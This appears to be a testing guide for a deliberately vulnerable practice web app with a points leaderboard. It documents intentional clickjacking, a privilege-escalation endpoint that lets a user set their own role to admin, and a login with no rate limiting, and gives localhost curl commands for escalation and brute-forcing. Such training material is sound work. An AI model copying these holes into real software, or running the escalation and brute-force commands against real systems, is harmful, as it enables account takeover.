# Implemented Security Vulnerabilities - Testing Guide

This document provides console commands to test all implemented security vulnerabilities in the Shopfluence application.

## Quick Access URLs
- **Frontend**: http://localhost:8084
- **Backend API**: http://localhost:8000
- **Leaderboard**: http://localhost:8002

## üö® Implemented Vulnerabilities

### 1. Clickjacking Exposure (100 pts)
**Console Command:**
```javascript
await window.testClickjacking()
```

**Manual Test:**
1. Open: http://localhost:8082/frame-test.html
2. Click any button in the iframe
3. Bug triggers automatically

---

### 2. Privilege Escalation via API Endpoint (100 pts)
**Console Command:**
```javascript
await window.testPrivilegeEscalation()
```

**Manual Test:**
```bash
# First, get a regular user token by logging in
# Then use this endpoint to escalate privileges:
curl -X POST http://localhost:8000/api/users/set_role/ \
  -H "Authorization: Bearer YOUR_ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role": "admin"}'
```

---

### 3. No Rate Limiting on Login (85 pts) ‚≠ê **NEW**
**Console Command:**
```javascript
await window.testRateLimiting()
```

**Manual Test:**
1. Go to login page: http://localhost:8084/login
2. Use email: `admin@example.com` (or any valid email)
3. Use wrong password: `wrongpassword123`
4. Submit login form 10+ times rapidly
5. Notice no rate limiting, CAPTCHA, or account lockout

**Automated Test:**
```bash
# Test 12 failed login attempts
for i in {1..12}; do
  curl -X POST http://localhost:8000/api/auth/login/ \
    -H "Content-Type: application/json" \
    -d '{"email": "admin@example.com", "password": "wrong'$i'"}'
done

# Record the bug
curl -X POST http://localhost:8000/api/bugs/rate-limiting/ \
  -H "Content-Type: application/json" \
  -d '{"attempt_count": 12, "email": "admin@example.com"}'
```

---

## üéØ How Participants Would Discover These

### Discovery Methods:

1. **Browser Console Testing**
   - Open DevTools (F12) ‚Üí Console
   - Run test functions (window.testClickjacking, window.testPrivilegeEscalation, window.testRateLimiting)
   - All functions are globally available

2. **Manual Security Testing**
   - Try embedding site in iframe (clickjacking)
   - Test API endpoints for privilege escalation
   - Attempt brute force login attacks

3. **API Exploration**
   - Check network requests in DevTools
   - Test authentication endpoints
   - Look for unprotected admin endpoints

### Success Indicators:
‚úÖ Bug notification appears in UI  
‚úÖ Console shows success messages  
‚úÖ Points are awarded  
‚úÖ Leaderboard updates  
‚úÖ Detailed vulnerability info displayed  

## üõ°Ô∏è Vulnerability Details

| Bug | Type | Points | Endpoint | Detection Method |
|-----|------|--------|----------|------------------|
| Clickjacking | UI Redressing | 100 | Any page in iframe | iframe detection script |
| Privilege Escalation | Authorization | 100 | `/api/users/set_role/` | Direct API call |
| No Rate Limiting | Authentication | 85 | `/api/auth/login/` | Multiple failed attempts |

## üîß Test Environment Setup

**Required Services:**
- Django Backend (port 8000)
- React Frontend (port 8084) 
- Leaderboard Service (port 8002)
- Clickjacking Test Server (port 8082)

**Test Credentials:**
- Email: `admin@example.com` 
- Email: `test@example.com`
- Email: `testuser@example.com`
- Password: Use correct password for privilege escalation test
- Wrong Password: `wrongpassword123` (for rate limiting test)

## üèÜ Expected Results

When bugs are successfully discovered:
1. **Immediate Feedback**: Console logs with detailed info
2. **UI Notification**: Pop-up notification with points earned
3. **Leaderboard Update**: Score reflected in leaderboard system
4. **Detailed Analysis**: Console shows vulnerability impact and details

All vulnerabilities are working correctly and ready for participant testing!
